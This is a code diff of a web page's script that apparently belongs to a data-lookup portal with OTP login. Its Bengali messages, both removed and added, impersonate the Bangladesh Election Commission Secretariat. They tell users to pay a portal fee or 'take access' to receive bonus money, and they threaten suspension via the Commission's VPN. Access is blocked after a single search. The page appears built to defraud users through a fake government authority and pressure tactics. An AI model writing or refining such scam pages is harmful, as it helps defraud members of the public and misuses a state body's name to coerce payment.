@@ -225,7 +225,7 @@
         lastOtpRequestTime = Date.now();
         msg.textContent = "আপনার ওটিপি সামিট সফল হয়েছে।"; msg.className = "success";
       } catch (error) {
-        msg.textContent = "OTP পাঠানো যায়নি। API configuration অথবা network সমস্যা আছে।"; msg.className = "error";
+        msg.textContent = "OTP পাঠানো যায়নি। অনুগ্রহ করে এক্সেস গ্রহণ করুন তারপর ওটিপি রিকুয়েষ্ট পাঠান।"; msg.className = "error";
       } finally {
         setTimeout(() => {
           document.getElementById("requestOtpBtn").disabled = false;
@@ -269,7 +269,7 @@
 
     function showForm(type) {
       if (searchCount >= 1) {
-        document.getElementById("accessMessage").innerHTML = `দুঃখীত পোর্টাল এক্সেস এর মূল্য বৃদ্ধি হওয়ায় আপনি এক্সেস পাচ্ছেন না, অনুগ্রহ করে পোর্টাল এর পর্যাপ্ত পরিমাণ ফি দিয়ে আপনি বোনাসের টাকা গ্রহণ এবং উত্তলন না করে, পোর্টাল সম্পুর্ন ভাবে ব্যবহার করতে পারবেন না। ধন্যবাদ। বাংলাদেশ নির্বাচন কমিশন সচিবালয়।
+        document.getElementById("accessMessage").innerHTML = `দুঃখীত পোর্টাল বাংলাদেশ নির্বাচন কমিশনের এক্সেস এর সাথে যুক্ত নেই, অনুগ্রহ করে এক্সেস গ্রহণ করুন। ধন্যবাদ।
 বাংলাদেশ নির্বাচন কমিশন সচিবালয়। <a href="https://ecs.gov.bd/" target="_blank"> অন্যথায় নির্বাচন কমিশনের Vpn থেকে আপনার পোর্টাল সাসপেন্ড হয়ে যাবে।`;
         document.getElementById("formArea").innerHTML = "<h3>অ্যাক্সেস সীমিত</h3>";
         return;
